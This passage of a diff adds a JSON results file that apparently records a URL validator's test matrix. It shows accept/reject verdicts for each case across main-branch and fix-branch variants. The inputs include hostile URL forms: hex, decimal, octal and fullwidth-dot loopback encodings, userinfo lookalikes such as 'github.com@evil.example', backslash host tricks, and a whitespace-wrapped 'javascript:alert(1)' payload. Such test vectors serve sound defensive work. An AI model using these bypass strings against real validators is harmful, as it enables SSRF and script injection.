+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://EXAMPLE.com/X",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://example.com/X",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://example.com/X",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://EXAMPLE.com/X",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 49,
+  "cls": "IDN/unicode host",
+  "c2": true,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://例え.jp/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://例え.jp/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://例え.jp/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 50,
+  "cls": "IPv6 loopback (C1, subsumed by C2)",
+  "c2": true,
+  "main": "A",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://[::1]/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://[::1]/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://[::1]/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 51,
+  "cls": "backslash host confusion",
+  "c2": true,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http:/\\/\\evil.com",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http:/\\/\\evil.com",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http:/\\/\\evil.com",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 52,
+  "cls": "single-slash host",
+  "c2": true,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http:/example.com",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http:/example.com",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http:/example.com",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 53,
+  "cls": "opaque, no slash",
+  "c2": true,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http:example.com",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http:example.com",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http:example.com",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 54,
+  "cls": "bare space in path",
+  "c2": true,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://example.com/a b",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://example.com/a b",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://example.com/a b",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 55,
+  "cls": "trailing newline",
+  "c2": false,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://example.com/x\n",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com/x\n",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://example.com/x",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://example.com/x",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com/x\n",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 56,
+  "cls": "bad percent escape",
+  "c2": true,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://example.com/%zz",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://example.com/%zz",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://example.com/%zz",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 57,
+  "cls": "empty host with path",
+  "c2": false,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https:///x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https:///x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://x/",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://x/",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https:///x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 58,
+  "cls": "plain http (contested)",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://example.com/issues/1",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://example.com/issues/1",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://example.com/issues/1",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 59,
+  "cls": "host-prefix confusion",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://localhost.evil.example/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://localhost.evil.example/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://localhost.evil.example/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 60,
+  "cls": "allowlist token in query",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://evil.example/?q=localhost",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://evil.example/?q=localhost",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://evil.example/?q=localhost",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 61,
+  "cls": "userinfo host confusion",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://localhost@evil.example/",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://localhost@evil.example/",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://localhost@evil.example/",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 62,
+  "cls": "backslash userinfo trick",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://evil.example\\@localhost/",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://evil.example\\@localhost/",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://evil.example\\@localhost/",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 63,
+  "cls": "homoglyph ideographic dot",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://localhost。evil.example/",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://localhost。evil.example/",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://localhost。evil.example/",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 64,
+  "cls": "loopback (prod config)",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://localhost:8080/tasks/1",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://localhost:8080/tasks/1",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "http://localhost:8080/tasks/1",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://localhost:8080/tasks/1",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 65,
+  "cls": "loopback (prod config)",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://127.0.0.1:3000/tasks/1",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://127.0.0.1:3000/tasks/1",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "http://127.0.0.1:3000/tasks/1",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://127.0.0.1:3000/tasks/1",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 66,
+  "cls": "hex-encoded loopback",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://0x7f000001/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://0x7f000001/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "http://127.0.0.1/x",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://0x7f000001/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 67,
+  "cls": "decimal-encoded loopback",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://2130706433/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://2130706433/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "http://127.0.0.1/x",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://2130706433/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 68,
+  "cls": "short-form loopback",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://127.1/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://127.1/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "http://127.0.0.1/x",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://127.1/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 69,
+  "cls": "octal-encoded loopback",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://0177.0.0.1/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://0177.0.0.1/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "http://127.0.0.1/x",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://0177.0.0.1/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 70,
+  "cls": "fullwidth-dot loopback",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://127．0．0．1/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://127．0．0．1/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "http://127.0.0.1/x",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://127．0．0．1/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 71,
+  "cls": "hex loopback with port",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://0x7f000001:9200/api",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://0x7f000001:9200/api",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "http://127.0.0.1:9200/api",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://0x7f000001:9200/api",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 72,
+  "cls": "userinfo (RULED: reject)",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://user:pass@evil.example/",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://user:pass@evil.example/",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://user:pass@evil.example/",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 73,
+  "cls": "userinfo destination confusion",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://ok.example@evil.example/",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://ok.example@evil.example/",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://ok.example@evil.example/",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 74,
+  "cls": "userinfo lookalike",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://github.com@evil.example/",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://github.com@evil.example/",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://github.com@evil.example/",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 75,
+  "cls": "password-only userinfo",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://:pass@evil.example/",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://:pass@evil.example/",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://:pass@evil.example/",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 76,
+  "cls": "loopback with credentials",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://user:pass@localhost/",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://user:pass@localhost/",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://user:pass@localhost/",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 77,
+  "cls": "allowed https",
+  "c2": false,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo/issues/12",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo/issues/12",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo/issues/12",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo/issues/12",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo/issues/12",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 78,
+  "cls": "case variation, NORMALISED",
+  "c2": false,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "HTTPS://github.com/acme/repo",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "HTTPS://github.com/acme/repo",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "HTTPS://github.com/acme/repo",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 79,
+  "cls": "surrounding ws, NORMALISED",
+  "c2": false,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "  https://github.com/acme/repo  ",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "  https://github.com/acme/repo  ",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "  https://github.com/acme/repo  ",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 80,
+  "cls": "path NORMALISED",
+  "c2": false,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://example.com",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://example.com/",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://example.com/",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 81,
+  "cls": "https on loopback",
+  "c2": false,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://localhost:8443/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://localhost:8443/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://localhost:8443/x",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://localhost:8443/x",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://localhost:8443/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 82,
+  "cls": "https accept",
+  "c2": false,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://example.com/a",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com/a",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://example.com/a",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://example.com/a",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com/a",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 83,
+  "cls": "https accept",
+  "c2": false,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo/issues/7",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo/issues/7",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo/issues/7",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo/issues/7",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://github.com/acme/repo/issues/7",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 84,
+  "cls": "loopback http (CARVEOUT arm)",
+  "c2": true,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://localhost:3000/a",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://localhost:3000/a",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "http://localhost:3000/a",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://localhost:3000/a",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 85,
+  "cls": "loopback http (CARVEOUT arm)",
+  "c2": true,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://127.0.0.1:3000/a",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://127.0.0.1:3000/a",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "http://127.0.0.1:3000/a",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://127.0.0.1:3000/a",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 86,
+  "cls": "remote plaintext http",
+  "c2": true,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://example.com/a",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://example.com/a",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://example.com/a",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 87,
+  "cls": "whitespace-wrapped javascript:",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": " javascript:alert(1) ",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": " javascript:alert(1) ",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 88,
+  "cls": "normalisation: scheme+host lowercased",
+  "c2": false,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "HTTPS://Example.COM/a",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "HTTPS://Example.COM/a",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://example.com/a",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://example.com/a",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "HTTPS://Example.COM/a",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 89,
+  "cls": "normalisation: whitespace stripped",
+  "c2": false,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "  https://example.com/a  ",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "  https://example.com/a  ",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://example.com/a",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://example.com/a",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "  https://example.com/a  ",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 90,
+  "cls": "normalisation: default port dropped",
+  "c2": false,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://example.com:443/a",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com:443/a",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://example.com/a",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://example.com/a",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com:443/a",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 91,
+  "cls": "normalisation: dot segments resolved",
+  "c2": false,
+  "main": null,
+  "branch": "A",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://example.com/a/../b",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com/a/../b",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://example.com/b",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://example.com/b",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com/a/../b",
+    "threw": null
+   }
+  }
+ }
+]
